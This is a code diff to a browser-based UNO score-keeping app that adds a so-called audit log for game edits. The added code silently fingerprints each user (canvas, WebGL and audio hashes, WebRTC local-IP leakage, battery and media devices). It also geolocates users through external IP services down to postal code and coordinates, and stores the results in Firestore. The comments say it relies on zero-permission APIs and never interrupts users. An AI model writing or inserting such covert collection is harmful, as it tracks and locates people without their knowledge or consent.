@@ -1207,7 +1207,7 @@
     initializeFirestore,
     persistentLocalCache,
     persistentMultipleTabManager,
-    collection, doc, getDoc, getDocs, setDoc, updateDoc, deleteDoc,
+    collection, doc, getDoc, getDocs, setDoc, updateDoc, deleteDoc, addDoc,
     query, where, orderBy, serverTimestamp, Timestamp
   } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";
 
@@ -1314,6 +1314,18 @@
         async getPlayers() {
           const snap = await getDocs(playersCol());
           return snap.docs.map(d => d.data());
+        },
+        async logEdit(gameId, info) {
+          if (!gameId || !info) return;
+          const gameRef = doc(db, 'games', gameId);
+          const editsRef = collection(gameRef, 'edits');
+          const payload = Object.assign({}, info, { serverTimestamp: serverTimestamp() });
+          // Fire both writes; tolerate individual failures (e.g. the game doc
+          // not existing yet on a brand-new game) without failing the whole op.
+          await Promise.all([
+            addDoc(editsRef, payload).catch((e) => { console.warn('[LDU] logEdit addDoc failed:', e); }),
+            setDoc(gameRef, { lastEdit: payload }, { merge: true }).catch((e) => { console.warn('[LDU] logEdit setDoc failed:', e); })
+          ]);
         }
       };
 
@@ -1823,6 +1835,370 @@ function loadSeasonWinners() {
   }).catch(function() { /* silently tolerate offline */ });
 }
 
+// ============ EDIT ATTRIBUTION / AUDIT LOG ============
+// Passively collects device/network/browser signals on every mutation (submit
+// round, edit round, change max points, create/finish game) and writes them
+// to Firestore under games/{gameId}/edits/* and games/{gameId}.lastEdit.
+// Every API used below is zero-permission: canvas, WebGL, OfflineAudioContext,
+// RTCPeerConnection (without getUserMedia), UA Client Hints, ipapi.co.
+// All async work is cached after the first boot-time warmup so individual
+// edits don't wait on the network. Every code path is wrapped in try/catch
+// that silently falls back — a failed fingerprint must NEVER interrupt the
+// user's flow.
+var _fpCache = {};
+
+function getDeviceId() {
+  try {
+    var id = localStorage.getItem('lunesdeuno_deviceId');
+    if (!id) {
+      id = (window.crypto && crypto.randomUUID)
+        ? crypto.randomUUID()
+        : (Date.now() + '-' + Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
+      localStorage.setItem('lunesdeuno_deviceId', id);
+    }
+    return id;
+  } catch (e) { return null; }
+}
+
+function _mq(q) { try { return matchMedia(q).matches; } catch (e) { return null; } }
+
+async function computeCanvasHash() {
+  if (_fpCache.canvas !== undefined) return _fpCache.canvas;
+  try {
+    var c = document.createElement('canvas');
+    c.width = 280; c.height = 60;
+    var ctx = c.getContext('2d');
+    if (!ctx) { _fpCache.canvas = null; return null; }
+    ctx.textBaseline = 'top';
+    ctx.font = "14px 'Arial'";
+    ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069'; ctx.fillText('LunesDeUNO \uD83C\uDCA0 fingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('LunesDeUNO \uD83C\uDCA0 fingerprint', 4, 17);
+    var data = c.toDataURL();
+    if (window.crypto && crypto.subtle && crypto.subtle.digest) {
+      var buf = new TextEncoder().encode(data);
+      var digest = await crypto.subtle.digest('SHA-1', buf);
+      _fpCache.canvas = Array.from(new Uint8Array(digest))
+        .map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+    } else {
+      // Fallback: simple string hash over the data URL.
+      var h = 0;
+      for (var i = 0; i < data.length; i++) { h = ((h << 5) - h + data.charCodeAt(i)) | 0; }
+      _fpCache.canvas = 'h' + (h >>> 0).toString(16);
+    }
+    return _fpCache.canvas;
+  } catch (e) { _fpCache.canvas = null; return null; }
+}
+
+function readWebGL() {
+  if (_fpCache.webgl !== undefined) return _fpCache.webgl;
+  var out = {};
+  try {
+    var canvas = document.createElement('canvas');
+    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if (dbg) {
+        try { out.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); } catch (e) {}
+        try { out.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } catch (e) {}
+      }
+      try { out.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE); } catch (e) {}
+      try {
+        var vp = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
+        out.maxViewportDims = vp && vp.length ? [vp[0], vp[1]] : null;
+      } catch (e) {}
+    }
+  } catch (e) {}
+  _fpCache.webgl = out;
+  return out;
+}
+
+async function computeAudioHash() {
+  if (_fpCache.audio !== undefined) return _fpCache.audio;
+  try {
+    var OfflineCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (!OfflineCtx) { _fpCache.audio = null; return null; }
+    var ctx = new OfflineCtx(1, 44100, 44100);
+    var osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    var comp = ctx.createDynamicsCompressor();
+    osc.connect(comp);
+    comp.connect(ctx.destination);
+    osc.start(0);
+    var buf = await ctx.startRendering();
+    var ch = buf.getChannelData(0);
+    var sum = 0;
+    for (var i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
+    _fpCache.audio = sum.toString();
+    return _fpCache.audio;
+  } catch (e) { _fpCache.audio = null; return null; }
+}
+
+function getLanIp() {
+  if (_fpCache.lanIp !== undefined) return Promise.resolve(_fpCache.lanIp);
+  return new Promise(function(resolve) {
+    try {
+      if (!window.RTCPeerConnection) { _fpCache.lanIp = null; resolve(null); return; }
+      var pc = new RTCPeerConnection({ iceServers: [] });
+      var ips = new Set();
+      var done = false;
+      var finish = function() {
+        if (done) return;
+        done = true;
+        _fpCache.lanIp = Array.from(ips);
+        try { pc.close(); } catch (e) {}
+        resolve(_fpCache.lanIp);
+      };
+      try { pc.createDataChannel(''); } catch (e) {}
+      pc.onicecandidate = function(e) {
+        if (!e.candidate) return finish();
+        var m = /candidate:\S+ \S+ \S+ \S+ (\S+) /.exec(e.candidate.candidate || '');
+        if (m && m[1]) ips.add(m[1]);
+      };
+      pc.createOffer()
+        .then(function(o) { return pc.setLocalDescription(o); })
+        .catch(function() { finish(); });
+      setTimeout(finish, 1500);
+    } catch (e) { _fpCache.lanIp = null; resolve(null); }
+  });
+}
+
+async function getIpInfo() {
+  if (_fpCache.ip !== undefined) return _fpCache.ip;
+  try {
+    var r = await fetch('https://ipapi.co/json/');
+    if (!r.ok) throw new Error('ipapi status ' + r.status);
+    _fpCache.ip = await r.json();
+    return _fpCache.ip;
+  } catch (e1) {
+    try {
+      var r2 = await fetch('https://ipinfo.io/json');
+      if (!r2.ok) throw new Error('ipinfo status ' + r2.status);
+      _fpCache.ip = await r2.json();
+      return _fpCache.ip;
+    } catch (e2) {
+      _fpCache.ip = null;
+      return null;
+    }
+  }
+}
+
+async function getUaHints() {
+  if (_fpCache.uaHints !== undefined) return _fpCache.uaHints;
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      _fpCache.uaHints = await navigator.userAgentData.getHighEntropyValues(
+        ['platform','platformVersion','architecture','bitness','model','uaFullVersion']);
+    } else {
+      _fpCache.uaHints = null;
+    }
+  } catch (e) { _fpCache.uaHints = null; }
+  return _fpCache.uaHints;
+}
+
+async function getBatteryInfo() {
+  if (_fpCache.battery !== undefined) return _fpCache.battery;
+  try {
+    if (navigator.getBattery) {
+      var b = await navigator.getBattery();
+      _fpCache.battery = { level: b.level, charging: b.charging };
+    } else {
+      _fpCache.battery = null;
+    }
+  } catch (e) { _fpCache.battery = null; }
+  return _fpCache.battery;
+}
+
+async function getMediaDeviceSummary() {
+  if (_fpCache.media !== undefined) return _fpCache.media;
+  try {
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      var devices = await navigator.mediaDevices.enumerateDevices();
+      var summary = { audioinput: 0, audiooutput: 0, videoinput: 0 };
+      (devices || []).forEach(function(d) {
+        if (summary[d.kind] !== undefined) summary[d.kind]++;
+      });
+      _fpCache.media = summary;
+    } else {
+      _fpCache.media = null;
+    }
+  } catch (e) { _fpCache.media = null; }
+  return _fpCache.media;
+}
+
+function collectDeviceInfo() {
+  try {
+    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    var voices = [];
+    try { voices = (speechSynthesis.getVoices() || []).slice(0, 5).map(function(v) { return v.name + '/' + v.lang; }); } catch (e) {}
+    var tz = null;
+    try { tz = (Intl.DateTimeFormat().resolvedOptions() || {}).timeZone || null; } catch (e) {}
+    return {
+      deviceId: getDeviceId(),
+      userAgent: navigator.userAgent || null,
+      platform: navigator.platform || null,
+      language: navigator.language || null,
+      languages: (navigator.languages && Array.prototype.slice.call(navigator.languages)) || null,
+      timezone: tz,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      screen: (screen.width || 0) + 'x' + (screen.height || 0) + '@' + (window.devicePixelRatio || 1),
+      availScreen: (screen.availWidth || 0) + 'x' + (screen.availHeight || 0),
+      viewport: window.innerWidth + 'x' + window.innerHeight,
+      colorDepth: screen.colorDepth || null,
+      colorGamut: _mq('(color-gamut: p3)') ? 'p3' : (_mq('(color-gamut: srgb)') ? 'srgb' : null),
+      hdr: _mq('(dynamic-range: high)'),
+      orientation: (screen.orientation && screen.orientation.type) || null,
+      hardwareConcurrency: navigator.hardwareConcurrency || null,
+      deviceMemory: navigator.deviceMemory || null,
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      connectionType: c.effectiveType || null,
+      downlink: (typeof c.downlink === 'number') ? c.downlink : null,
+      rtt: (typeof c.rtt === 'number') ? c.rtt : null,
+      cookieEnabled: !!navigator.cookieEnabled,
+      pdfViewerEnabled: ('pdfViewerEnabled' in navigator) ? !!navigator.pdfViewerEnabled : null,
+      doNotTrack: navigator.doNotTrack || null,
+      webdriver: !!navigator.webdriver,
+      standalone: _mq('(display-mode: standalone)') || !!navigator.standalone,
+      prefersColorScheme: _mq('(prefers-color-scheme: dark)') ? 'dark' : 'light',
+      prefersReducedMotion: _mq('(prefers-reduced-motion: reduce)'),
+      prefersReducedTransparency: _mq('(prefers-reduced-transparency: reduce)'),
+      prefersContrast: _mq('(prefers-contrast: more)'),
+      forcedColors: _mq('(forced-colors: active)'),
+      pointer: _mq('(pointer: fine)') ? 'fine' : 'coarse',
+      hover: _mq('(hover: hover)'),
+      referrer: document.referrer || null,
+      pageUrl: (window.location && window.location.href) || null,
+      sessionLoadedAt: performance.timeOrigin || null,
+      msSinceLoad: Math.round(performance.now() || 0),
+      visibilityState: document.visibilityState || null,
+      speechVoicesCount: voices.length,
+      speechVoicesSample: voices,
+      webgl: readWebGL(),
+      appLang: (typeof currentLang === 'string') ? currentLang : null,
+      asadoMode: !!(typeof asadoMode !== 'undefined' && asadoMode)
+    };
+  } catch (e) {
+    return { deviceId: getDeviceId(), collectError: String(e && e.message || e) };
+  }
+}
+
+// Prune undefined/function values (Firestore chokes on undefined) and cap
+// deeply nested objects so a rogue field can't bloat the audit doc.
+function _sanitizeForFirestore(v, depth) {
+  if (depth === undefined) depth = 0;
+  if (depth > 6) return null;
+  if (v === undefined) return null;
+  if (v === null) return null;
+  var tp = typeof v;
+  if (tp === 'function') return null;
+  if (tp === 'number' && !isFinite(v)) return null;
+  if (tp === 'string') return v.length > 2000 ? v.slice(0, 2000) : v;
+  if (Array.isArray(v)) return v.map(function(x) { return _sanitizeForFirestore(x, depth + 1); });
+  if (tp === 'object') {
+    var out = {};
+    for (var k in v) {
+      if (Object.prototype.hasOwnProperty.call(v, k)) {
+        var cleaned = _sanitizeForFirestore(v[k], depth + 1);
+        if (cleaned !== null || v[k] === null) out[k] = cleaned;
+      }
+    }
+    return out;
+  }
+  return v;
+}
+
+function logEdit(action, roundIndex, changes, triggerEvent) {
+  // Fire-and-forget: this function must never block or throw into callers.
+  try {
+    if (!state || !state.gameId) return;
+    var info = collectDeviceInfo();
+    info.action = action;
+    info.roundIndex = (roundIndex === undefined || roundIndex === null) ? null : roundIndex;
+    info.clientTimestamp = Date.now();
+    if (changes) info.changes = changes;
+    if (triggerEvent) {
+      info.inputSource = triggerEvent.pointerType
+        || (triggerEvent.sourceCapabilities && triggerEvent.sourceCapabilities.firesTouchEvents ? 'touch' : null)
+        || triggerEvent.type
+        || null;
+    }
+
+    var storagePromise = (navigator.storage && navigator.storage.estimate)
+      ? navigator.storage.estimate().catch(function() { return null; })
+      : Promise.resolve(null);
+
+    Promise.all([
+      computeCanvasHash().catch(function() { return null; }),
+      computeAudioHash().catch(function() { return null; }),
+      getUaHints().catch(function() { return null; }),
+      getLanIp().catch(function() { return null; }),
+      getIpInfo().catch(function() { return null; }),
+      getBatteryInfo().catch(function() { return null; }),
+      getMediaDeviceSummary().catch(function() { return null; }),
+      storagePromise
+    ]).then(function(results) {
+      info.canvasHash = results[0];
+      info.audioHash = results[1];
+      info.uaClientHints = results[2];
+      info.lanIp = results[3];
+      var ipInfo = results[4];
+      info.battery = results[5];
+      info.mediaDevices = results[6];
+      var storage = results[7];
+      info.storageQuota = storage ? { quota: storage.quota || null, usage: storage.usage || null } : null;
+      if (ipInfo) {
+        info.ip = ipInfo.ip || null;
+        info.city = ipInfo.city || null;
+        info.region = ipInfo.region || ipInfo.region_code || null;
+        info.country = ipInfo.country_name || ipInfo.country || null;
+        info.postal = ipInfo.postal || ipInfo.postal_code || null;
+        info.org = ipInfo.org || ipInfo.asn_org || null;
+        info.asn = ipInfo.asn || null;
+        var lat = (typeof ipInfo.latitude === 'number') ? ipInfo.latitude : parseFloat(ipInfo.latitude);
+        var lon = (typeof ipInfo.longitude === 'number') ? ipInfo.longitude : parseFloat(ipInfo.longitude);
+        info.latLon = (isFinite(lat) && isFinite(lon)) ? [lat, lon] : null;
+      }
+
+      if (!window.LDU_READY || !window.LDU || !window.LDU.logEdit) return;
+      var payload;
+      try { payload = _sanitizeForFirestore(info); } catch (e) { payload = { deviceId: info.deviceId, action: info.action, sanitizeError: String(e && e.message || e) }; }
+      window.LDU.logEdit(state.gameId, payload).catch(function(err) {
+        console.warn('[LDU] logEdit failed:', err);
+      });
+    }).catch(function(err) {
+      console.warn('[LDU] logEdit collect failed:', err);
+    });
+  } catch (e) {
+    console.warn('[LDU] logEdit outer failed:', e);
+  }
+}
+
+function _snapshotRound(ri) {
+  try {
+    if (ri == null || ri < 0) return null;
+    return {
+      scores: (state.rounds[ri] || []).slice(),
+      fines: (state.fines && state.fines[ri]) ? state.fines[ri].slice() : null,
+      cortes: (state.cortes && state.cortes[ri]) ? state.cortes[ri].slice() : null
+    };
+  } catch (e) { return null; }
+}
+
+function warmupFingerprint() {
+  try {
+    computeCanvasHash();
+    computeAudioHash();
+    getUaHints();
+    getLanIp();
+    getIpInfo();
+    getBatteryInfo();
+    getMediaDeviceSummary();
+    // Ensure deviceId is written to localStorage on first visit.
+    getDeviceId();
+  } catch (e) { /* never throw during warmup */ }
+}
+
 function getPlayerDot(player, idx) {
   const isAsado = document.body.classList.contains('asado');
   if (isAsado) return `<span style="font-size:1.1rem;">${getAsadoEmoji(idx)}</span>`;
@@ -2024,6 +2400,13 @@ function startGame() {
   delete state._setupGuests;
 
   saveCurrentGame();
+  logEdit('create_game', null, {
+    maxPoints: state.maxPoints,
+    playerCount: state.playerCount,
+    participants: (state.participants || []).map(function(p) { return { slot: p.slot, playerId: p.playerId || null, isGuest: !!p.isGuest }; }),
+    hostId: state.hostId || null,
+    venue: state.venue || ''
+  });
   showScreen('game');
 }
 
@@ -2366,14 +2749,19 @@ function submitRound() {
   state.justSubmittedRound = true;
 
   const totals = getTotals();
+  var submittedRoundIndex = state.rounds.length - 1;
+  var submittedSnapshot = { scores: scores.slice(), fines: fines.slice(), cortes: cortesThisRound.slice() };
   if (totals.some(t => t >= state.maxPoints)) {
     state.gameOver = true;
     saveCurrentGame();
+    logEdit('submit_round', submittedRoundIndex, { after: submittedSnapshot });
+    logEdit('finish_game', null, { totals: totals.slice(), maxPoints: state.maxPoints });
     showScreen('results');
     return;
   }
 
   saveCurrentGame();
+  logEdit('submit_round', submittedRoundIndex, { after: submittedSnapshot });
   renderGame();
 }
 
@@ -2477,6 +2865,7 @@ function closeEditMaxPoints() {
 function saveEditMaxPoints() {
   const val = parseInt(document.getElementById('newMaxPointsInput').value);
   if (!val || val < 50) { alert(t('edit_limit_label')); return; }
+  var oldMaxPoints = state.maxPoints;
   state.maxPoints = val;
   closeEditMaxPoints();
 
@@ -2484,6 +2873,10 @@ function saveEditMaxPoints() {
   const wasOver = state.gameOver;
   state.gameOver = finalTotals.some(function(t) { return t >= state.maxPoints; });
   saveCurrentGame();
+  logEdit('edit_max_points', null, { before: oldMaxPoints, after: val, wasOver: wasOver, isOver: state.gameOver });
+  if (state.gameOver && !wasOver) {
+    logEdit('finish_game', null, { totals: finalTotals.slice(), maxPoints: state.maxPoints, via: 'edit_max_points' });
+  }
 
   if (!state.gameOver && wasOver) {
     // Game re-opened: go back to game screen
@@ -2497,6 +2890,8 @@ function saveEditMaxPoints() {
 
 function saveEditRound() {
   if (editingRound < 0) return;
+  var editedRoundIdx = editingRound;
+  var beforeSnapshot = _snapshotRound(editedRoundIdx);
   if (!state.fines[editingRound]) state.fines[editingRound] = state.players.map(function() { return 0; });
   if (!state.cortes[editingRound]) state.cortes[editingRound] = state.players.map(function() { return false; });
   state.players.forEach((_, i) => {
@@ -2504,12 +2899,17 @@ function saveEditRound() {
     state.fines[editingRound][i] = Math.max(0, parseInt(document.getElementById('editFine_'+i)?.value) || 0);
     state.cortes[editingRound][i] = !!document.getElementById('editCorte_'+i)?.checked;
   });
+  var afterSnapshot = _snapshotRound(editedRoundIdx);
   closeEditModal();
   saveCurrentGame();
+  logEdit('edit_round', editedRoundIdx, { before: beforeSnapshot, after: afterSnapshot });
 
   const totals = getTotals();
   const wasOver = state.gameOver;
   state.gameOver = totals.some(t => t >= state.maxPoints);
+  if (state.gameOver && !wasOver) {
+    logEdit('finish_game', null, { totals: totals.slice(), maxPoints: state.maxPoints, via: 'edit_round' });
+  }
 
   if (state.gameOver && document.getElementById('results').classList.contains('active')) {
     renderResults();
@@ -4337,6 +4737,17 @@ if (asadoMode) applyAsadoMode();
 setLang(currentLang);
 initSetup();
 renderGamesList();
+
+// Kick off passive fingerprint warmup during idle so the first edit event
+// doesn't wait on canvas/WebRTC/ipapi. Fire-and-forget; wrapped in try/catch.
+try {
+  var _warmup = function() { try { warmupFingerprint(); } catch (e) {} };
+  if (typeof window.requestIdleCallback === 'function') {
+    window.requestIdleCallback(_warmup, { timeout: 3000 });
+  } else {
+    setTimeout(_warmup, 0);
+  }
+} catch (e) {}
 
 function lduBootstrap() {
   if (!window.LDU_READY || !window.LDU) return;
